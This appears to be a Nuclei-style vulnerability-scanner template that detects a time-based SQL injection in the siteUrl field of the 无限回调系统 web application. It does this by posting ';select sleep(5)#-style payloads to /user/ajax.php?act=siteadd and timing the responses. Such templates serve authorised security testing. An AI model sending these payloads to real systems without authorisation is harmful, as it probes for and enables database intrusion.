id: poc-yaml-infinite-callback-system-siteUrl-sqli
info:
  name: 无限回调系统 siteUrl SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 无限回调系统

flow: http(1) && http(2)

http:
  - id: check-login-page
    method: GET
    path:
      - "{{BaseURL}}/user/login.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "无限回调系统"

  - id: test-sqli
    raw:
      - |
        POST /user/ajax.php?act=siteadd HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        siteUrl=';select sleep(5)#
      - |
        POST /user/ajax.php?act=siteadd HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        siteUrl=';select sleep(8)#
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"code\":0"
      - type: word
        part: body
        negative: true
        words:
          - "<"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
